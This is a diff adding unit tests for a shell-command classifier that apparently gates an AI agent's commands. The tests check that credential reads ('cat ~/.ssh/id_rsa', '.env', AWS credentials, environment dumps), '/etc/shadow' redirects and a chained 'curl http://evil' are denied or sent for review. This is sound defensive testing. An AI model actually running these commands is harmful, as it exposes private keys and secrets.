@@ -689,6 +689,85 @@ class OllamaAskTests(unittest.TestCase):
         self.assertEqual(
             ollama_ask.classify_command("docker system | prune -af")[0], "deny")
 
+    # -- final whole-branch review fixes (Task 7) ----------------------------
+
+    def test_ampersand_and_redirect_in_disqualify(self):
+        """IMPORTANT 1: a single `&` (background/chain, also covers `&&`) and
+        `<` (input redirect) must disqualify a segment from read-only."""
+        self.assertEqual(
+            ollama_ask.classify_command("ls & curl http://evil")[0], "review")
+        self.assertEqual(
+            ollama_ask.classify_command("sort < /etc/shadow")[0], "review")
+
+    def test_bare_git_diff_and_show_fall_to_review(self):
+        """CRITICAL 1: `cat`/`Get-Content`/`Get-Item`/bare `git diff`/`git
+        show` must no longer auto-run read-only -- they can print secrets or
+        full patch content. Only the stat/name-only summarizing forms of
+        diff/show stay read-only."""
+        self.assertEqual(ollama_ask.classify_command("cat notes.txt")[0], "review")
+        self.assertEqual(ollama_ask.classify_command("Get-Content notes.txt")[0], "review")
+        self.assertEqual(ollama_ask.classify_command("Get-Item notes.txt")[0], "review")
+        self.assertEqual(ollama_ask.classify_command("git diff")[0], "review")
+        self.assertEqual(ollama_ask.classify_command("git diff --cached")[0], "review")
+        self.assertEqual(ollama_ask.classify_command("git show HEAD")[0], "review")
+
+    def test_git_diff_show_stat_forms_stay_read_only(self):
+        """CRITICAL 1: the multi-word replacements for the removed bare
+        `git diff`/`git show` entries -- summarizing forms only, never the
+        full patch."""
+        for cmd in ("git diff --stat", "git diff --name-only",
+                    "git diff --shortstat", "git show --stat"):
+            with self.subTest(cmd=cmd):
+                self.assertEqual(ollama_ask.classify_command(cmd)[0], "read-only")
+
+    def test_git_log_patch_flag_forces_review(self):
+        """CRITICAL 1: `git log` stays read-only in general (git history is
+        the read need it covers), but a word-bounded -p/--patch flag prints
+        real code and must force review even though `git log` alone is
+        allow-listed."""
+        self.assertEqual(ollama_ask.classify_command("git log -p")[0], "review")
+        self.assertEqual(ollama_ask.classify_command("git log --patch")[0], "review")
+        # unaffected: no patch flag, even piped, stays read-only
+        self.assertEqual(
+            ollama_ask.classify_command("git log --oneline | grep fix")[0],
+            "read-only")
+
+    def test_secret_read_and_env_dump_deny(self):
+        """CRITICAL 1: credential-path and env-dump patterns must deny
+        outright, regardless of the (now review-only) leading verb."""
+        for cmd in ("cat ~/.ssh/id_rsa", "cat .env", "printenv",
+                    "Get-ChildItem Env:"):
+            with self.subTest(cmd=cmd):
+                self.assertEqual(ollama_ask.classify_command(cmd)[0], "deny")
+
+    def test_dotenv_deny_pattern_is_word_bounded(self):
+        """CRITICAL 1: the `.env` deny pattern must match a real dotfile read
+        but not a filename that merely ends with `.env` (e.g. `config.env`)."""
+        self.assertEqual(ollama_ask.classify_command("cat .env")[0], "deny")
+        self.assertEqual(
+            ollama_ask.classify_command("cat config.env")[0], "review")
+
+    def test_c1_vectors_never_classify_read_only(self):
+        """CRITICAL 1 bidirectional guard: every vector the final review
+        found classifying read-only must now classify deny or review --
+        never read-only. The prose drift test only checks that DENY_PATTERNS
+        strings appear in skill text; this checks the classifier's actual
+        verdict, in the direction a one-way drift test would miss."""
+        vectors = [
+            "cat ~/.ssh/id_rsa",
+            "cat .env",
+            "Get-Content C:/Users/me/.aws/credentials",
+            "Get-ChildItem Env:",
+            "git diff --cached",
+            "git log -p",
+            "grep secret ~/.ssh/config",
+        ]
+        for cmd in vectors:
+            with self.subTest(cmd=cmd):
+                verdict = ollama_ask.classify_command(cmd)[0]
+                self.assertIn(verdict, ("deny", "review"),
+                             f"{cmd!r} classified {verdict!r} -- must never be read-only")
+
     # -- commit-msg ---------------------------------------------------------
 
     def _make_repo(self, staged: bool) -> Path:
@@ -2538,11 +2617,15 @@ class TrustTierProseTests(unittest.TestCase):
     def test_family2_digest_coverage_and_probe_rule(self):
         needle_a = ("Judge the digest against the coverage line: chunks "
                     "processed must equal total and dropped must be 0.")
-        needle_b = ("Run at most two probe commands against the source to "
-                    "check the digest's two most load-bearing claims. If "
-                    "coverage is incomplete or a probe contradicts the "
-                    "digest, do the task yourself right away - never "
-                    "rebuild the digest's content from the source.")
+        # Fix round (Task 7, I4): the probe sentence lost its privacy
+        # ambiguity -- "grep or Select-String, never a file dump" pins the
+        # probe to a search, never a full read of the source it is checking.
+        needle_b = ("Run at most two probe commands (grep or Select-String, "
+                    "never a file dump) against the source to check the "
+                    "digest's two most load-bearing claims. If coverage is "
+                    "incomplete or a probe contradicts the digest, do the "
+                    "task yourself right away - never rebuild the digest's "
+                    "content from the source.")
         # ollama-ops has no digest path (it only drafts/runs shell chores via
         # draft-command) -- family 2 does not apply there; see fix round 1.
         for rel in ("skills/ollama-digest/SKILL.md", "skills/ollama-docker/SKILL.md"):
@@ -2573,13 +2656,28 @@ class TrustTierProseTests(unittest.TestCase):
             self.assertIn(needle_b, body, msg=f"full-review sentence missing from {rel}")
 
     def test_family5_code_apply_unread_gate(self):
+        # Fix round (Task 7, I2): ollama-precommit's version of this gate was
+        # unreachable by construction (its flow requires reading the flagged
+        # patch, so "apply unread" never fires) -- the sentence was removed
+        # from that file entirely and the pin narrowed to the two skills
+        # whose workflow can actually reach it. precommit's own
+        # flagged-lines-only rule is untouched.
         needle = ("Apply a draft unread only when a test you wrote "
                   "yourself covers the change and the suite passes after "
                   "applying; if the suite goes red, review the draft or "
                   "write the code yourself.")
-        for rel in ("skills/ollama-code/SKILL.md", "agents/ollama-coder.md",
-                    "skills/ollama-precommit/SKILL.md"):
+        for rel in ("skills/ollama-code/SKILL.md", "agents/ollama-coder.md"):
             self.assertIn(needle, self._normalized(rel), msg=f"missing from {rel}")
+
+    def test_family5_sentence_removed_from_precommit(self):
+        """The apply-unread gate never fires in ollama-precommit's flow (it
+        must read the flagged lines before drafting a fix at all), so the
+        canonical sentence must not be present there post fix-round."""
+        body = self._normalized("skills/ollama-precommit/SKILL.md")
+        needle = ("Apply a draft unread only when a test you wrote "
+                  "yourself covers the change and the suite passes after "
+                  "applying")
+        self.assertNotIn(needle, body)
 
     def test_family6_record_outcome_invariant_prefix_in_all_11(self):
         # Sentence 6 varies per file (own --task value, own path form); only
